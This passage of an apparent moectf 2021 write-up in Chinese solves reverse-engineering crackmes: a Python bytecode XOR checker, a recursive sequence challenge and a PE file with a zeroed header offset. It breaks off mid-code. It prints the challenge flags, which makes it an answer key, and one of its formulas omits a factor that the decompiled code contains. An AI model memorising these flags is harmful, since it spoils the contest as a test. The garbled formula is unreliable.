class="line">            [Free Vars]</span><br><span class="line">            [Cell Vars]</span><br><span class="line">            [Constants]</span><br><span class="line">                None</span><br><span class="line">                45</span><br><span class="line">            [Disassembly]</span><br><span class="line">                0       LOAD_GLOBAL             0: xxor</span><br><span class="line">                2       LOAD_FAST               0: x</span><br><span class="line">                4       LOAD_FAST               1: y</span><br><span class="line">                6       CALL_FUNCTION           2</span><br><span class="line">                8       LOAD_CONST              1: 45</span><br><span class="line">                10      BINARY_XOR</span><br><span class="line">                12      RETURN_VALUE</span><br><span class="line">        [Code]</span><br><span class="line">            File Name: Midpython.py</span><br><span class="line">            Object Name: &lt;lambda&gt;</span><br><span class="line">            Arg Count: 2</span><br><span class="line">            Pos Only Arg Count: 0</span><br><span class="line">            KW Only Arg Count: 0</span><br><span class="line">            Locals: 2</span><br><span class="line">            Stack Size: 3</span><br><span class="line">            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)</span><br><span class="line">            [Names]</span><br><span class="line">                &#x27;xoor&#x27;</span><br><span class="line">            [Var Names]</span><br><span class="line">                &#x27;x&#x27;</span><br><span class="line">                &#x27;y&#x27;</span><br><span class="line">            [Free Vars]</span><br><span class="line">            [Cell Vars]</span><br><span class="line">            [Constants]</span><br><span class="line">                None</span><br><span class="line">                14</span><br><span class="line">            [Disassembly]</span><br><span class="line">                0       LOAD_GLOBAL             0: xoor</span><br><span class="line">                2       LOAD_FAST               0: x</span><br><span class="line">                4       LOAD_FAST               1: y</span><br><span class="line">                6       CALL_FUNCTION           2</span><br><span class="line">                8       LOAD_CONST              1: 14</span><br><span class="line">                10      BINARY_XOR</span><br><span class="line">                12      RETURN_VALUE</span><br><span class="line">        &#x27;&gt;&gt;&gt;input your flag:\n&gt;&gt;&gt;&#x27;</span><br><span class="line">        1</span><br><span class="line">        0</span><br><span class="line">        &#x27;&gt;&gt;&gt;Right!!&#x27;</span><br><span class="line">        &#x27;&gt;&gt;&gt;Wrong!!&#x27;</span><br><span class="line">        None</span><br><span class="line">    [Disassembly]</span><br><span class="line">        0       BUILD_LIST              0</span><br><span class="line">        2       LOAD_CONST              0: (69, 70, 79, 72, 88, 75, 85, 127, 89, 85, 74, 19, 74, 122, 107, 103, 75, 77, 9, 73, 29, 28, 67)</span><br><span class="line">        4       LIST_EXTEND             1</span><br><span class="line">        6       STORE_NAME              0: key</span><br><span class="line">        8       LOAD_CONST              1: &lt;CODE&gt; &lt;lambda&gt;</span><br><span class="line">        10      LOAD_CONST              2: &#x27;&lt;lambda&gt;&#x27;</span><br><span class="line">        12      MAKE_FUNCTION           0</span><br><span class="line">        14      STORE_NAME              1: xxor</span><br><span class="line">        16      LOAD_CONST              3: &lt;CODE&gt; &lt;lambda&gt;</span><br><span class="line">        18      LOAD_CONST              2: &#x27;&lt;lambda&gt;&#x27;</span><br><span class="line">        20      MAKE_FUNCTION           0</span><br><span class="line">        22      STORE_NAME              2: xoor</span><br><span class="line">        24      LOAD_CONST              4: &lt;CODE&gt; &lt;lambda&gt;</span><br><span class="line">        26      LOAD_CONST              2: &#x27;&lt;lambda&gt;&#x27;</span><br><span class="line">        28      MAKE_FUNCTION           0</span><br><span class="line">        30      STORE_NAME              3: xorr</span><br><span class="line">        32      LOAD_NAME               4: len</span><br><span class="line">        34      LOAD_NAME               0: key</span><br><span class="line">        36      CALL_FUNCTION           1</span><br><span class="line">        38      STORE_NAME              5: length</span><br><span class="line">        40      LOAD_NAME               6: input</span><br><span class="line">        42      LOAD_CONST              5: &#x27;&gt;&gt;&gt;input your flag:\n&gt;&gt;&gt;&#x27;</span><br><span class="line">        44      CALL_FUNCTION           1</span><br><span class="line">        46      STORE_NAME              7: ipt</span><br><span class="line">        48      LOAD_CONST              6: 1</span><br><span class="line">        50      STORE_NAME              8: flag</span><br><span class="line">        52      LOAD_NAME               4: len</span><br><span class="line">        54      LOAD_NAME               7: ipt</span><br><span class="line">        56      CALL_FUNCTION           1</span><br><span class="line">        58      LOAD_NAME               5: length</span><br><span class="line">        60      COMPARE_OP              2 (==)</span><br><span class="line">        62      POP_JUMP_IF_FALSE       114</span><br><span class="line">        64      LOAD_NAME               9: range</span><br><span class="line">        66      LOAD_NAME               5: length</span><br><span class="line">        68      CALL_FUNCTION           1</span><br><span class="line">        70      GET_ITER</span><br><span class="line">        72      FOR_ITER                38 (to 112)</span><br><span class="line">        74      STORE_NAME              10: i</span><br><span class="line">        76      LOAD_NAME               3: xorr</span><br><span class="line">        78      LOAD_NAME               11: ord</span><br><span class="line">        80      LOAD_NAME               7: ipt</span><br><span class="line">        82      LOAD_NAME               10: i</span><br><span class="line">        84      BINARY_SUBSCR</span><br><span class="line">        86      CALL_FUNCTION           1</span><br><span class="line">        88      LOAD_NAME               10: i</span><br><span class="line">        90      CALL_FUNCTION           2</span><br><span class="line">        92      LOAD_NAME               0: key</span><br><span class="line">        94      LOAD_NAME               10: i</span><br><span class="line">        96      BINARY_SUBSCR</span><br><span class="line">        98      COMPARE_OP              3 (!=)</span><br><span class="line">        100     POP_JUMP_IF_FALSE       72</span><br><span class="line">        102     LOAD_CONST              7: 0</span><br><span class="line">        104     STORE_NAME              8: flag</span><br><span class="line">        106     POP_TOP</span><br><span class="line">        108     JUMP_ABSOLUTE           118</span><br><span class="line">        110     JUMP_ABSOLUTE           72</span><br><span class="line">        112     JUMP_FORWARD            4 (to 118)</span><br><span class="line">        114     LOAD_CONST              7: 0</span><br><span class="line">        116     STORE_NAME              8: flag</span><br><span class="line">        118     LOAD_NAME               8: flag</span><br><span class="line">        120     LOAD_CONST              6: 1</span><br><span class="line">        122     COMPARE_OP              2 (==)</span><br><span class="line">        124     POP_JUMP_IF_FALSE       136</span><br><span class="line">        126     LOAD_NAME               12: print</span><br><span class="line">        128     LOAD_CONST              8: &#x27;&gt;&gt;&gt;Right!!&#x27;</span><br><span class="line">        130     CALL_FUNCTION           1</span><br><span class="line">        132     POP_TOP</span><br><span class="line">        134     JUMP_FORWARD            8 (to 144)</span><br><span class="line">        136     LOAD_NAME               12: print</span><br><span class="line">        138     LOAD_CONST              9: &#x27;&gt;&gt;&gt;Wrong!!&#x27;</span><br><span class="line">        140     CALL_FUNCTION           1</span><br><span class="line">        142     POP_TOP</span><br><span class="line">        144     LOAD_CONST              10: None</span><br><span class="line">        146     RETURN_VALUE</span><br></pre></td></tr></table></figure><p>“说人话?”<br>好吧原来的人工反编译结果找不到了, 直接把官方WP搬过来:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">69</span>, <span class="number">70</span>, <span class="number">79</span>, <span class="number">72</span>, <span class="number">88</span>, <span class="number">75</span>, <span class="number">85</span>, <span class="number">127</span>, <span class="number">89</span>, <span class="number">85</span>, <span class="number">74</span>, <span class="number">19</span>, <span class="number">74</span>, <span class="number">122</span>, <span class="number">107</span>, <span class="number">103</span>, <span class="number">75</span>, <span class="number">77</span>, <span class="number">9</span>, <span class="number">73</span>, <span class="number">29</span>, <span class="number">28</span>, <span class="number">67</span>]</span><br><span class="line">xxor = <span class="keyword">lambda</span> x, y: (x ^ y) ^ <span class="number">11</span></span><br><span class="line">xoor = <span class="keyword">lambda</span> x, y: xxor(x, y) ^ <span class="number">45</span></span><br><span class="line">xorr = <span class="keyword">lambda</span> x, y: xoor(x, y) ^ <span class="number">14</span></span><br><span class="line">length = <span class="built_in">len</span>(key)</span><br><span class="line">ipt = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt;input your flag:\n&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(ipt) == length:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">if</span> xorr(<span class="built_in">ord</span>(ipt[i]), i) != key[i]:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt;Right!!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt;Wrong!!&quot;</span>)</span><br></pre></td></tr></table></figure><p>解密:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">69</span>, <span class="number">70</span>, <span class="number">79</span>, <span class="number">72</span>, <span class="number">88</span>, <span class="number">75</span>, <span class="number">85</span>, <span class="number">127</span>, <span class="number">89</span>, <span class="number">85</span>, <span class="number">74</span>, <span class="number">19</span>, <span class="number">74</span>, <span class="number">122</span>, <span class="number">107</span>, <span class="number">103</span>, <span class="number">75</span>, <span class="number">77</span>, <span class="number">9</span>, <span class="number">73</span>, <span class="number">29</span>, <span class="number">28</span>, <span class="number">67</span>]</span><br><span class="line">xxor = <span class="keyword">lambda</span> x, y: (x ^ y) ^ <span class="number">11</span></span><br><span class="line">xoor = <span class="keyword">lambda</span> x, y: xxor(x, y) ^ <span class="number">45</span></span><br><span class="line">xorr = <span class="keyword">lambda</span> x, y: xoor(x, y) ^ <span class="number">14</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(xorr((key[i]), i)), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>moectf{Pyth0n_M@st3r!!}</p></blockquote><h3 id="ez-Algorithm"><a href="#ez-Algorithm" class="headerlink" title="ez_Algorithm"></a>ez_Algorithm</h3><p>逆向出来发现一个使用递归(效率很低)的算法:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">fuck</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a1;</span><br><span class="line">  v2 = fuck((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">return</span> v2 + <span class="number">2</span> * (<span class="keyword">unsigned</span> <span class="keyword">int</span>)fuck((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">2</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写成数学式就是:</p><script type="math/tex; mode=display">fuck(n)=\left\{\begin{aligned}n & , & 0 \leq n \lt 2 \\fuck(n-1) + fuck(n-2) & , & n \geq 2 \\\end{aligned}\right.</script><p>让我们帮它优化亿下:</p><script type="math/tex; mode=display">fuck(n)=\left\{\begin{aligned}n & , & 0 \leq n \lt 2 \\fuck(n-2) + 2^{n-2} & , & n \geq 2 \\\end{aligned}\right.</script><p>就不求通项了, 反正速度也挺快-_-:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> key[] = &#123;<span class="number">0x6D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x21</span>, <span class="number">0x55</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCD</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x00</span>, <span class="number">0x2E</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9F</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x33</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9C</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x66</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xD9</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x0A</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xCA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x64</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9A</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x0A</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9C</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x3D</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9A</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x26</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xF4</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x62</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9A</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x38</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x98</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x2B</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x65</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xF4</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x2C</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9B</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x20</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xF4</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x27</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x98</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x34</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9A</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x64</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xD1</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x66</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xF4</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x62</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x66</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xF4</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x38</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x98</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x34</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xC5</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x64</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xC5</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x32</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xF4</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x65</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xCD</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x0A</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xFF</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x64</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xC6</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x66</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xF4</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x36</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9B</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x38</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xDB</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x64</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x98</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x2D</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x9A</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x62</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xD2</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x6A</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x94</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x6A</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0xD6</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">fuck</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> r = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) <span class="keyword">return</span> n;</span><br><span class="line">    <span class="keyword">if</span> (n &gt;= <span class="number">34</span>) n = (n &amp; <span class="number">1</span>) ? <span class="number">33</span> : <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">while</span> (n &gt; <span class="number">1</span>)&#123;</span><br><span class="line">        n -= <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (n &lt; <span class="number">32</span>) r |= <span class="number">1</span> &lt;&lt; n;</span><br><span class="line">    &#125;</span><br><span class="line">    r |= n;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint32_t</span> *flag = (<span class="keyword">const</span> <span class="keyword">uint32_t</span> *)key;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">75</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">putchar</span>(fuck(i * i) ^ flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总之这个题很有意思, 它让我想起了被数列支配的恐惧.</p><blockquote><p>moectf{4f73r_a11_7h1s_71m3~D0_y0u_r3a11z3_7h3_m3an1ng_0f_T1m3_c0mp13x17y???}</p></blockquote><h3 id="PEPEPE"><a href="#PEPEPE" class="headerlink" title="PEPEPE"></a>PEPEPE</h3><p>打开IDA, 诶, 怎么变16位程序了?</p><blockquote><p>科普一下, PE是32/64位Windows下的可执行文件, 其中一个特点为能在对应系统下运行以外, 还能在16位DOS下运行(虽然运行结果只是提示一条消息). 这是Windows的一贯作风: 在版本更迭时, 仍然会保持变态的兼容性, 甚至因此现在Windows下的路径分隔符仍然是反斜杠而不是更有现代风格的斜杠. 所以, 你可以永远相信Windows的向下兼容能力, 虽然说向下兼容有好有坏.</p></blockquote><p>IDA没有识别到PE头, 只识别到MZ头. 用16进制打开发现PE偏移被置零了(0x3C处). 把PE偏移填上0x00000080就OK了. 深入了解PE结构, 可以看看《Windows PE权威指南》</p><p>现在再打开IDA, 发现这次正常了. 在main中可以直接看到加密的全过程:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v4; <span class="comment">// [esp+18h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-14h]</span></span><br><span class="line">  FILE *v6; <span class="comment">// [esp+20h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// [esp+24h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  <span class="comment">// logo 就不输出了</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[root@Track.Sh]# Welcome to moectf2021! It&#x27;s just a mirror flower moon~&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  v7 = <span class="built_in">strlen</span>(input);</span><br><span class="line">  v6 = fopen(<span class="string">&quot;file_org&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    fseek(v6, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">    v5 = ftell(v6);</span><br><span class="line">    rewind(v6);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 - <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      bank[i] = getc(v6);</span><br><span class="line">      bank[i] = ~(bank[i] ^ input[i % v7]);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v6);</span><br><span class="line">    v4 = fopen(<span class="string">&quot;file&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v5; ++j )</span><br><span class="line">      fputc((<span class="keyword">int</span>)v4, (FILE *)bank[j]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[root@Track.Sh]# It&#x27;s over, I don&#x27;t know what you gonna do but... Just keep justy.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[root@Track.Sh]# An unexcepted error happened:(&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然不知道之前输入了什么, 我们还是尝试解密一下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;file&quot;</span>, <span class="string">&quot;rb&quot;</span>), *g = fopen(<span class="string">&quot;out&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fseek(f, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="keyword">long</span> len = ftell(f), i;</span><br><span class="line">    rewind(f);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        putc(~getc(f), g);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(f); fclose(g);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用记事本打开输出文件, 解密了, 但是, 没有完全解密.<br>记事本中有这么一段:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 